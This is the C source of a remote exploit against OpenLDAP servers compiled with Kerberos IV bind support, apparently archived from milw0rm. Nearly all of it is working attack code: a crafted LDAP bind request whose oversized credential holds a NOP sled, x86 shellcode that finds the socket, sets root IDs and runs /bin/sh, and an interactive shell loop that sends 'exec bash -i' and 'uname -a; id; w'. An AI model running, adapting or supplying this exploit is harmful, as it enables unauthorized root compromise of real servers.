/*
 * openldap-kbind-p00f.c - OpenLDAP kbind remote exploit
 *
 * Only works on servers compiled with
 *   --enable-kbind    enable LDAPv2+ Kerberos IV bind (deprecated) [no]
 *
 * by Solar Eclipse <solareclipse@phreedom.org>
 *
 * Shoutouts to LSD for their l33t asm code and to all 0dd people
 *
 * Private 0dd code.
 *
 */

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <errno.h>
#include <stdio.h>

extern int errno;

#define SHELLCODE_LEN (1250+2+32)
#define SHELLCODE_ADDR 0xbf5feed0

#define LDAP_AUTH_SIMPLE	0x80U
#define LDAP_AUTH_KRBV41	0x81U

#define FINDSCKPORTOFS     46

u_char shellcode[]=
/* 72 bytes findsckcode by LSD-pl */
    "\x31\xdb"             /* xorl    %ebx,%ebx              */
    "\x89\xe7"             /* movl    %esp,%edi              */
    "\x8d\x77\x10"         /* leal    0x10(%edi),%esi        */
    "\x89\x77\x04"         /* movl    %esi,0x4(%edi)         */
    "\x8d\x4f\x20"         /* leal    0x20(%edi),%ecx        */
    "\x89\x4f\x08"         /* movl    %ecx,0x8(%edi)         */
    "\xb3\x10"             /* movb    $0x10,%bl              */
    "\x89\x19"             /* movl    %ebx,(%ecx)            */
    "\x31\xc9"             /* xorl    %ecx,%ecx              */
    "\xb1\xff"             /* movb    $0xff,%cl              */
    "\x89\x0f"             /* movl    %ecx,(%edi)            */
    "\x51"                 /* pushl   %ecx                   */
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\xb0\x66"             /* movb    $0x66,%al              */
    "\xb3\x07"             /* movb    $0x07,%bl              */
    "\x89\xf9"             /* movl    %edi,%ecx              */
    "\xcd\x80"             /* int     $0x80                  */
    "\x59"                 /* popl    %ecx                   */
    "\x31\xdb"             /* xorl    %ebx,%ebx              */
    "\x39\xd8"             /* cmpl    %ebx,%eax              */
    "\x75\x0a"             /* jne     <findsckcode+54>       */
    "\x66\xb8\x12\x34"     /* movw    $0x1234,%bx            */
    "\x66\x39\x46\x02"     /* cmpw    %bx,0x2(%esi)          */
    "\x74\x02"             /* je      <findsckcode+56>       */
    "\xe2\xe0"             /* loop    <findsckcode+24>       */
    "\x89\xcb"             /* movl    %ecx,%ebx              */
    "\x31\xc9"             /* xorl    %ecx,%ecx              */
    "\xb1\x03"             /* movb    $0x03,%cl              */
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\xb0\x3f"             /* movb    $0x3f,%al              */
    "\x49"                 /* decl    %ecx                   */
    "\xcd\x80"             /* int     $0x80                  */
    "\x41"                 /* incl    %ecx                   */
    "\xe2\xf6"             /* loop    <findsckcode+62>       */

/* 10 byte setresuid(0,0,0); by core */
    "\x31\xc9"       /* xor    %ecx,%ecx */
    "\xf7\xe1"       /* mul    %ecx,%eax */
    "\x51"           /* push   %ecx */
    "\x5b"           /* pop    %ebx */
    "\xb0\xa4"       /* mov    $0xa4,%al */
    "\xcd\x80"       /* int    $0x80 */

/* 24 bytes execl("/bin/sh", "/bin/sh", 0); by LSD-pl */
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdql                           */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;

#define COMMAND1 "echo 'a'; TERM=xterm; export TERM=xterm; exec bash -i;\n"
#define COMMAND2 "uname -a; id; w;\n"

/* mixter's code w/enhancements by core */

int sh(int sockfd) {
   char snd[1024], rcv[1024];
   fd_set rset;
   int maxfd, n;

   /* Priming commands */
   strcpy(snd, COMMAND1 "\n");
   write(sockfd, snd, strlen(snd));

   strcpy(snd, COMMAND2 "\n");
   write(sockfd, snd, strlen(snd));

   /* Main command loop */
   for (;;) {
      FD_SET(fileno(stdin), &rset);
      FD_SET(sockfd, &rset);
      
      maxfd = ( ( fileno(stdin) > sockfd )?fileno(stdin):sockfd ) + 1;
      select(maxfd, &rset, NULL, NULL, NULL);
      
      if (FD_ISSET(fileno(stdin), &rset)) {
	 bzero(snd, sizeof(snd));
	 fgets(snd, sizeof(snd)-2, stdin);
	 write(sockfd, snd, strlen(snd));
      }
      
      if (FD_ISSET(sockfd, &rset)) {
	 bzero(rcv, sizeof(rcv));
	 
	 if ((n = read(sockfd, rcv, sizeof(rcv))) == 0) {
	    printf("Good Bye!\n");
	    return 0;
	 }
	 
	 if (n < 0) {
	    perror("read");
	    return 1;
	 }
	 
	 fputs(rcv, stdout);
	 fflush(stdout); /* keeps output nice */
      }
   } /* for(;;) */
}

/* Connect to the host */
int connect_host(char* host, int port)
{
	struct sockaddr_in s_in;
	int sock;

	s_in.sin_family = AF_INET;
	s_in.sin_addr.s_addr = inet_addr(host);
	s_in.sin_port = htons(port);

	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) <= 0) {
		printf("Could not create a socket\n");
		exit(1);
	}

	if (connect(sock, (struct sockaddr *)&s_in, sizeof(s_in)) < 0) {
		printf("Connection to %s:%d failed: %s\n", host, port, strerror(errno));
		exit(1);
	}

	return sock;
}

int get_local_port(int sock)
{
	struct sockaddr_in s_in;
	int namelen = sizeof(s_in);
	
	if (getsockname(sock, (struct sockaddr *)&s_in, &namelen) < 0) {
		printf("Can't get local port: %s\n", strerror(errno));
		exit(1);
	}

	return s_in.sin_port;
}

int read_data(int sock, char* buf, int len)
{
	int l;
	int to_read = len;

	do {
		if ((l = read(sock, buf, to_read)) < 0) {
			printf("Error in read: %s\n", strerror(errno));
			exit(1);
		}
		to_read -= len;
	} while (to_read > 0);

	return len;
}

int read_bind_result(int sock)
{
	char buf[1000];

	read_data(sock, buf, 2);
	if (buf[0] != 0x30) {
		/* openldap is 0wned  :-P */
		return -1;
	}

	read_data(sock, &buf[2], buf[1]);
	
	if ((buf[2] != 0x02) && (buf[3] != 0x01)) {	/* message id */
		printf("Malformed bind result\n");
		exit(1);
	}

	if (buf[5] != 0x61) {						/* message type */
		printf("Malformed bind result\n");
		exit(1);
	}

	if (buf[6] < 7) {							/* message length */
		printf("Malformed bind result\n");
		exit(1);
	}

	if ((buf[7] != 0x0a) && (buf[8] != 0x01)) {	/* result code */
		printf("Malformed bind result\n");
		exit(1);
	}

	return buf[9];		/* result code */
}

int send_bind_request(int sock, char method, char* dn, char* cred)
{
	int cred_len, message_len, request_len;
	char krb_bind_request[2000];
	char* p;

	memcpy(krb_bind_request,
		"\x30\x82\xff\xff"	/* request length */
		"\x02\x01\x01"		/* message id = 1 */
		"\x60"				/* bind request */
		"\x82\xff\xff"		/* message length */
		"\x02\x01\x02"		/* LDAP version 3 */
		"\x04",				/* dn */
	15);
	
	p = &krb_bind_request[15];
	
	if (strlen(dn) > 255) {
		printf("bind_dn too long\n");
		exit(1);
	}

	*p++ = (char)strlen(dn);
	strcpy(p, dn);

	p += strlen(dn);
	
	*p++ = method;		/* authentication method */
	*p++ = '\x82';

	cred_len = strlen(cred);
	
	*p++ = (char) ((cred_len >> 8) & 0xff);
	*p++ = (char) (cred_len & 0xff);
	
	strcpy(p, cred);
	
	message_len = 5 + strlen(dn) + 4 + cred_len;
	krb_bind_request[9] = (char) ((message_len >> 8) & 0xff);
	krb_bind_request[10] = (char) (message_len & 0xff);

	request_len = 7 + message_len;
	krb_bind_request[2] = (char) ((request_len >> 8) & 0xff);
	krb_bind_request[3] = (char) (request_len & 0xff);
	
	send(sock, krb_bind_request, 4+request_len, 0);
}

void build_shellcode(char* p, int len)
{
	int i;

	i = len - 64 - strlen(shellcode);
	memset(p, 0x90, i);
	strncpy(&p[i], shellcode, strlen(shellcode));

	for (i = len - 64; i < len; i+= 4) {
		*(int*)&p[i] = SHELLCODE_ADDR;
	}
}

char res_buf[30];

char* ldap_result(int code) {
	switch (code) {
		case 0x00:	return "LDAP_SUCCESS (0x00)";
		case 0x01:	return "LDAP_OPERATIONS_ERROR (0x01)";
		case 0x02:	return "LDAP_PROTOCOL_ERROR (0x02)";
		case 0x07:	return "LDAP_AUTH_METHOD_NOT_SUPPORTED (0x07)\nMost likely cause: the OpenLDAP server was not compiled with --enable-kbind.";
		case 0x08:	return "LDAP_STRONG_AUTH_REQUIRED (0x08)";
		case 0x0e:	return "LDAP_SASL_BIND_IN_PROGRESS (0x0e)";
		case 0x22:	return "LDAP_INVALID_DN_SYNTAX (0x22)\nCheck your bind_dn.";
		case 0x30:	return "LDAP_INAPPROPRIATE_AUTH (0x30)";
		case 0x31:	return "LDAP_INVALID_CREDENTIALS (0x31)\nThe bind_dn must exist in the LDAP directory.";
		case 0x32:	return "LDAP_INSUFFICIENT_ACCESS (0x32)";
		case 0x33:	return "LDAP_BUSY (0x33)";
		case 0x34:	return "LDAP_UNAVAILABLE (0x34)";
		case 0x35:	return "LDAP_UNWILLING_TO_PERFORM (0x35)";
		case 0x50:	return "LDAP_OTHER (0x50)";
		case 0x51:	return "LDAP_SERVER_DOWN (0x51)";
		case 0x54:	return "LDAP_DECODING_ERROR (0x54)";
	default:
		sprintf(res_buf, "%x", code);
		return res_buf;
	}
}

/* run, code, run */
int main(int argc, char* argv[])
{
	char shellcode_buf[SHELLCODE_LEN+1];
	int port, sock, res;
	char* dn;
	char* p;

	printf(": openldap-kbind-p00f.c - OpenLDAP kbind remote exploit\n");
	printf("\n");
	printf(": Only works on servers compiled with\n");
	printf("    --enable-kbind    enable LDAPv2+ Kerberos IV bind (deprecated) [no]\n");
	printf("\n");
	printf(": by Solar Eclipse <solareclipse@phreedom.org>\n\n");
	
	if (argc < 3) {
		printf(": Usage: %s hostname bind_dn\n", argv[0]);
		printf("  The bind_dn must exist in the LDAP directory.\n");
		exit(1);
	}

	dn = argv[2];

	port = 389; /*atoi(argv[2]);*/
	sock = connect_host(argv[1], port);

/*
	send_bind_request(sock, LDAP_AUTH_SIMPLE, dn, "secret");
	res = read_bind_result(sock);
	printf("LDAP_AUTH_SIMPLE bind request returned %s\n", ldap_result(res));
*/

/*	send_bind_request(sock, LDAP_AUTH_KRBV41, dn, "secret");
	res = read_bind_result(sock);
	printf("LDAP_AUTH_KRBV41 bind request returned %s\n", ldap_result(res));	
*/
	port = get_local_port(sock);

	shellcode[FINDSCKPORTOFS] = (char) (port & 0xff);
	shellcode[FINDSCKPORTOFS+1] = (char) ((port >> 8) & 0xff);

	build_shellcode(shellcode_buf, SHELLCODE_LEN);
	shellcode_buf[SHELLCODE_LEN] = '\0';

	printf("Sending shellcode\n");
	send_bind_request(sock, LDAP_AUTH_KRBV41, dn, shellcode_buf);
	
	sleep(2);

	/* Priming commands */
	write(sock, "echo 'a';\n", 10);

	printf("Reading bind result\n");
	res = read_bind_result(sock);
	if (res > 0)
		printf("LDAP_AUTH_KRBV41 bind request returned %s\n", ldap_result(res));
	else {
		printf("Spawning shell...\n");
		sh(sock);
	}

	close(sock);
	
	return 0;
}

// milw0rm.com [2006-12-15]
